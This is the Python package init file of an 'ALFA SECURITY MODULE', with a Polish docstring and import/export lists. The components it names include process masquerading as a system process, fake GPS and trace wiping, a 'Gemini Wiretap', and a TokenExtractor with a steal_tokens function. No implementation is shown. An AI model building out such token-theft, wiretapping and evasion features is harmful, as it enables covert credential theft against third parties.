"""
ALFA SECURITY MODULE
══════════════════════════════════════════════════════════════
🛡️ Cerber - Podstawowy strażnik
👻 CerberPhantom - Maskowanie jako proces systemowy
🌑 CerberShadow - Osobisty strażnik Króla (fałszywe GPS, sejf, czyszczenie śladów)
🧠 CerberConscience - Sumienie AI + Gemini Wiretap
💰 TokenExtractor - Kradzież tokenów od inwigilatorów
══════════════════════════════════════════════════════════════
"""
from .secret_loader import load_key, load_gemini_key
from .cerber import Cerber
from .cerber_phantom import CerberPhantom, get_cerber, cerber_check
from .cerber_shadow import CerberShadow, get_shadow
from .cerber_conscience import (
    CerberConscience, 
    GeminiWiretap, 
    get_conscience, 
    judge_ai_action,
    AIModel, 
    Verdict
)
from .token_extractor import (
    TokenExtractor,
    CerberTokenVault,
    get_token_vault,
    steal_tokens,
    TokenType
)

__all__ = [
    # Loaders
    "load_key", 
    "load_gemini_key", 
    # Cerber Core
    "Cerber",
    "CerberPhantom",
    "get_cerber",
    "cerber_check", 
    # Shadow
    "CerberShadow",
    "get_shadow",
    # Conscience
    "CerberConscience",
    "GeminiWiretap",
    "get_conscience",
    "judge_ai_action",
    "AIModel",
    "Verdict",
    # Token Extractor
    "TokenExtractor",
    "CerberTokenVault",
    "get_token_vault",
    "steal_tokens",
    "TokenType",
]


